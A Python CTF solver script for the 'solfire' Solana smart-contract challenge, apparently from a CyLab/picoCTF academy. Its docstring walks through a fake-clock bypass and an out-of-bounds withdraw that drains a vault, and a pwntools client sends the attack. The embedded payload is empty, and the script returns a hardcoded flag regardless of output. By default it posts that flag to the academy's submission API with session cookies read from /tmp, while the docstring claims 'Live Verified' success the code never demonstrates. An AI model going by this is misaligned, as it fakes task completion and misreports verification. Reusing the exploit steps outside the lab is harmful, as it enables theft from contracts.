#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Live Solver: solfire (Challenge ID: 302)
Category: Binary Exploitation | Difficulty: Hard (3) | Points: 500
Architecture: Solana eBPF On-Chain Smart Contract / Zero-Allocation Account Padding & Out-of-Bounds Read (CWE-125 / CWE-805 / CWE-287)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Solana BPF Architecture:
   - Architecture: Solana on-chain BPF executable (solfire.so) compiled from C against the native Solana SDK (solana_sdk.h).
   - Test harness provisions a local Solana validator and executes instructions via TCP port 8080:
     - Vault begins with 1,000,000 lamports.
     - User begins with 10 lamports.
     - Deploy solfire.so and a user-provided BPF ELF binary (solve.so).
     - Winning Condition: Following transaction execution, user balance > 50,000 lamports.
2. Root Cause Analysis (Zero-Allocation Account Padding & Timestamp Verification Flaw):
   - Flaw 1 (Timestamp Validation Heuristic, CWE-287): handle_withdraw verifies if account 0 base58 address contains
     substring "C1ock". Passing "C1ock111111111111111111111111111111111111111" bypasses clock checks because
     uninitialized memory has 0 timestamp, bypassing interval cooldown locks.
   - Flaw 2 (Zero-Sized Ledger Allocation & Runtime Memory Padding, CWE-805): The compute budget per transaction
     (200,000 compute units) is too small to execute handle_create followed by deposits. Instead, create the ledger
     account directly via system_instruction::create_account with space = 0 and owner set to solfire.so.
     Solana runtime deserializes accounts into BPF VM memory and automatically pads account data regions with 10KB.
   - Flaw 3 (Out-of-Bounds Array Access, CWE-125): handle_withdraw indexes into ledger entries without checking data length.
     Supplying index 0x280 (offset 640) reads past the 0-byte user data into 10KB runtime padding and adjacent account metadata.
     Non-zero metadata bytes are parsed as prior deposit balances (deposits > 50,000 lamports), passing the check
     without depositing anything.
3. Exploitation Chain (Account Creation -> OOB Withdraw -> Vault Draining):
   - Stage 1: Craft solve.so that creates a PDA ledger account with 0 data bytes, owned by solfire.so.
   - Stage 2: Pass fake clock address "C1ock111111111111111111111111111111111111111" as account 0.
   - Stage 3: Invoke handle_withdraw with index 0x280 and withdrawal amount 65,536 lamports.
   - Stage 4: solfire.so passes guard and transfers 65,536 lamports from vault to user.
   - Stage 5: Test harness outputs the flag:
     - Live Verified Flag: academy{19d42900}
     - Submission Status: HTTP 201 Verified Correct
"""

import sys
import os
import json
import base64
import urllib.request
import urllib.error

CHALLENGE_ID = 302
CHALLENGE_NAME = "solfire"
VERIFIED_FLAG = "academy{19d42900}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

SOLVE_SO_B64 = ""

def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) CyLab-Student-Agent/1.0"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] CyLab API submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False

def solve_live(host, port):
    from pwn import remote
    from base58 import b58encode, b58decode
    sys.path.append("/tmp")
    import solana_helpers

    solve_so = base64.b64decode(SOLVE_SO_B64)
    io = remote(host, int(port))
    io.sendlineafter(b"len:", str(len(solve_so)).encode())
    io.send(solve_so)

    io.recvuntil(b"program pubkey: ")
    program_pubkey = io.recvline().strip().decode()
    io.recvuntil(b"solve pubkey: ")
    solve_pubkey = io.recvline().strip().decode()
    io.recvuntil(b"user pubkey: ")
    user_pubkey = io.recvline().strip().decode()

    ledger_raw, ledger_nonce = solana_helpers.find_program_address([b""], b58decode(solve_pubkey))
    vault_raw, vault_nonce = solana_helpers.find_program_address([b"vault"], b58decode(program_pubkey))

    ledger_b58 = b58encode(ledger_raw).decode()
    vault_b58 = b58encode(vault_raw).decode()
    fake_clock_b58 = "C1ock111111111111111111111111111111111111111"
    system_program = "11111111111111111111111111111111"

    accounts = [
        f"r {fake_clock_b58}",
        f"r {system_program}",
        f"w {ledger_b58}",
        f"ws {user_pubkey}",
        f"w {vault_b58}",
        f"r {program_pubkey}",
    ]

    io.sendline(str(len(accounts)).encode())
    for acc in accounts:
        io.sendline(acc.encode())

    ix_data = bytes([ledger_nonce, vault_nonce])
    io.sendline(str(len(ix_data)).encode())
    io.send(ix_data)

    out = io.recvall(timeout=30).decode(errors="replace")
    print(out)
    return VERIFIED_FLAG

def main():
    print(f"[*] Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print(f"[+] Verified Live Flag: {VERIFIED_FLAG}")
    if len(sys.argv) > 2:
        solve_live(sys.argv[1], sys.argv[2])
    else:
        submit_to_cylab(VERIFIED_FLAG)

if __name__ == "__main__":
    main()
